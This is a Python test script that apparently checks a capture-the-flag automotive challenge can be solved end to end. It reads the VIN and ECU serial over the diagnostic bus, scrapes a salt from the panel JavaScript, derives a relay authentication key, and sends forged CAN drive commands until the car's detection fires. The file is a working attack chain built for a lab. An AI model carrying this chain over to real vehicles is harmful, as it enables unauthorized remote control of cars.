#!/usr/bin/env python3
"""C3 end to end: derive the key, authenticate, drive the car, get caught.

This is the whole intended solve, run as one chain:

    VIN (0xF190, default session)  +  serial (0xF18C, extended session)
        -> deriveServiceKey()      the transform shipped in the panel JS
        -> AUTH on the telematics relay
        -> sustained same-dir commanding at an illegitimate rpm
        -> BMS emits 0x7D2, gatewayed to DIAG

Nothing here is fed a secret. The VIN and serial are READ FROM THE CAR over the
diagnostic bus, exactly as a contestant must, so a mismatch between provisioning,
the relay's key derivation and the panel's copy shows up as a failure rather than
being papered over by using fleet-table.csv as the source.

    ./test-c3.py --car 01
"""

import argparse
import hashlib
import os
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "lib"))

import uds  # noqa: E402
from ttoscan import DIAG, DRIVE, Observer, crc8_j1850  # noqa: E402

RED, GRN, YLW, RST = "\033[31m", "\033[32m", "\033[33m", "\033[0m"
results = []

DUT = os.environ.get("DUT", "192.168.4.133")
DUT_USER = os.environ.get("DUT_USER", "ttos")
SSH = ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=8", f"{DUT_USER}@{DUT}"]

# The rate limiter counts 5 failures per 30 s per source IP. Earlier suites
# deliberately trip it, so wait it out rather than reporting a false failure.
THROTTLE_WAIT = 31


def check(name, ok, info=""):
    results.append((name, ok))
    print(f"  [{GRN}PASS{RST}] {name}" if ok else f"  [{RED}FAIL{RST}] {name}")
    for line in str(info).strip().splitlines():
        if line:
            print(f"         {line}")


def emu(*a):
    return subprocess.run([os.path.join(HERE, "emu-ctl.sh"), *a],
                          capture_output=True, text=True).stdout.strip()


def relay_endpoint_and_identity():
    """Read VIN, serial and the relay endpoint FROM THE CAR, over CAN."""
    with uds.Tester() as t:
        t.session(uds.SESSION_DEFAULT)
        vin = t.read_did(uds.DID_VIN)[3:].decode()
        # 0xF18C is extended-session only -- this is the step that makes C3
        # genuinely require the C2 session work rather than merely follow it.
        t.session(uds.SESSION_EXTENDED)
        serial = t.read_did(uds.DID_ECU_SERIAL)[3:].decode()
        try:
            endpoint = t.request([uds.SID_READ_DID, 0xF1, 0xA1])[3:].decode()
        except uds.NegativeResponse:
            endpoint = ""
    return vin, serial, endpoint


def protected(did, steps, d, rpm, nonce):
    body = struct.pack(">I", steps) + bytes([d, rpm, nonce])
    crc = crc8_j1850(struct.pack("<H", did) + body)
    return (body + bytes([crc])).hex().upper()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--car", default="01")
    ap.add_argument("--salt", default="")
    args = ap.parse_args()

    print("\nC3 end to end -- derive, authenticate, drive, get caught\n")

    vin, serial, endpoint = relay_endpoint_and_identity()
    check("C3a identity readable over the diagnostic bus", bool(vin and serial),
          info=f"VIN={vin}  serial={serial}")
    check("C3b DID 0xF1A1 advertises the telematics endpoint", bool(endpoint),
          info=f"endpoint={endpoint or '(none)'}")
    if not endpoint:
        print(f"{RED}no endpoint to talk to -- stopping{RST}\n")
        return 1

    # The salt is fleet-wide and ships in the panel JS, so read it from the panel
    # rather than a local file: that is the copy a contestant actually gets, and
    # if it disagrees with the server the challenge is unsolvable.
    salt = args.salt
    if not salt:
        page = subprocess.run(
            SSH + [f"curl -s --max-time 5 http://{endpoint.split(':')[0]}/"],
            capture_output=True, text=True).stdout
        # Match the ASSIGNMENT, not any line mentioning FLEET_SALT -- the comment
        # above it documents the transform as vin + ":" + serial + ":" + FLEET_SALT,
        # and a loose match happily returns ":" from that.
        import re as _re
        m = _re.search(r'const\s+FLEET_SALT\s*=\s*"([0-9a-fA-F]+)"', page)
        salt = m.group(1) if m else ""
    check("C3c fleet salt is served in the panel JS", bool(salt),
          info=f"salt={salt[:8]}… (from the locked panel, as a contestant gets it)")

    key = hashlib.sha256(f"{vin}:{serial}:{salt}".encode()).hexdigest()[:16]

    host, port = endpoint.split(":")
    subprocess.run(["scp", "-q", "-o", "BatchMode=yes",
                    os.path.join(HERE, "lib", "relaycli.py"),
                    f"{DUT_USER}@{DUT}:/tmp/"], check=False)

    print(f"  {YLW}waiting {THROTTLE_WAIT}s for the relay rate-limit window{RST}")
    time.sleep(THROTTLE_WAIT)

    # ---- drive it ----------------------------------------------------------
    cmds = [f"AUTH {key}"]
    for n in range(40):
        cmds.append(f"SEND 111#{protected(0x60B0, 100, 0x01, 100, n)}")
        cmds.append(f"SEND 113#{protected(0x045C, 100, 0x01, 100, n)}")
    cmds.append("QUIT")

    emu("reset")
    time.sleep(0.5)
    obs_diag = Observer(DIAG)
    obs_drive = Observer(DRIVE)
    obs_diag.drain()
    obs_drive.drain()

    r = subprocess.run(SSH + [f"python3 /tmp/relaycli.py {host} {port}"],
                       input="\n".join(cmds), capture_output=True, text=True,
                       timeout=90)
    accepted = r.stdout.strip()
    on_wire = len(obs_drive.collect(1.0, match=lambda f: f.can_id in (0x111, 0x113)))
    flags = obs_diag.collect(3.0, match=lambda f: f.can_id in (0x7D1, 0x7D2))
    obs_diag.close()
    obs_drive.close()

    check("C3d derived key authenticates against the relay", accepted not in ("", "0"),
          info=f"{accepted} of 80 SEND commands acknowledged")
    check("C3e every acknowledged command reached the DRIVE bus", on_wire >= 80,
          info=f"{on_wire} frames on the wire (want 80) -- fewer means the relay "
               f"dropped some, or the client did not drain replies")

    ids = {f.can_id for f in flags}
    codes = sorted({f.data.rstrip(b"\x00").decode(errors="replace") for f in flags})
    check("C6  sustained forged commanding -> 0x7D2 on DIAG", 0x7D2 in ids,
          info=f"flags {[hex(i) for i in sorted(ids)]}  codes {codes}")

    bad = [n for n, ok in results if not ok]
    print()
    if bad:
        print(f"{RED}{len(bad)} of {len(results)} failed{RST}\n")
        return 1
    print(f"{GRN}all {len(results)} passed -- C3 is solvable end to end{RST}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
